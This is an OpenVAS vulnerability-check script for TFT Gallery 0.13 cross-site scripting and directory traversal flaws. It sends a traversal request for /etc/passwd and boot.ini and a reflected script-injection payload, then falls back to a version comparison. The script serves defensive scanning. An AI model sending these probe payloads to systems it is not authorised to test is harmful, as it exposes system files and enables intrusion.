###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_tftgallery_mult_vuln_nov09.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# TFT Gallery XSS And Directory Traversal Vulnerabilities
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to disclose
sensitive information and conduct cross-site scripting attacks.

Impact Level: Application";

tag_affected = "TFT Gallery version 0.13 and prior on all platforms.";

tag_insight = "
- Error exists when input passed via the 'sample' parameter to
settings.php is not properly sanitised before being returned to the user. This
can be exploited to execute arbitrary HTML and script code or conduct XSS attacks.

- Input passed via the 'album' parameter to index.php is not properly
  verified before being used to include files via a '../'. This can be
  exploited to include arbitrary files from local resources via directory
  traversal attacks and URL-encoded NULL bytes.";

tag_solution = "Upgrade to version 0.13.1 or later,
For updates refer to http://www.tftgallery.org";

tag_summary = "This host is installed with TFT Gallery and is prone to Cross-
Site Scripting and Directory Traversal vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900974");
  script_version("$Revision: 9350 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2009-11-17 15:16:05 +0100 (Tue, 17 Nov 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2009-3911", "CVE-2009-3912");
  script_bugtraq_id(36898, 36899);
  script_name("TFT Gallery XSS And Directory Traversal Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/37156");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/54087");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/0911-exploits/tftgallery-traversal.txt");

  script_tag(name:"qod_type", value:"remote_banner");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("tftgallery_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

tftPort = get_http_port(default:80);
if(!tftPort){
  exit(0);
}

tftVer = get_kb_item(string("www/", tftPort, "/tftgallery"));
tftVer = eregmatch(pattern:"^(.+) under (/.*)$", string:tftVer);

if((tftVer[2] != NULL) && !safe_checks())
{
  foreach dir (make_list("etc/passwd", "boot.ini"))
  {
    sndReq = http_get(item:tftVer[2] + "/index.php?album=../../../../../../" +
                           "../../../../" + dir + "%00&page=1>", port:tftPort);
    rcvRes = http_send_recv(port:tftPort, data:sndReq);

    if(rcvRes =~ "root:x:0:[01]:.*" || (rcvRes =~ "\[boot loader\]"))
    {
      security_message(port:tftPort);
      exit(0);
    }
  }

  sndReq = http_get(item:tftVer[2]+"/settings.php?sample='></link><script>alert"+
                         "('OpenVAS-XSS-TEST')</script>&amp;name=cucumber cool",
                    port:tftPort);
  rcvRes = http_send_recv(port:tftPort, data:sndReq);

  if(rcvRes =~ "HTTP/1\.. 200" && "OpenVAS-XSS-TEST" >< rcvRes)
  {
    security_message(port:tftPort);
    exit(0);
  }
}

if(tftVer[1] != NULL)
{
  if(version_is_less_equal(version: tftVer[1], test_version:"0.13")){
    security_message(tftPort);
  }
}
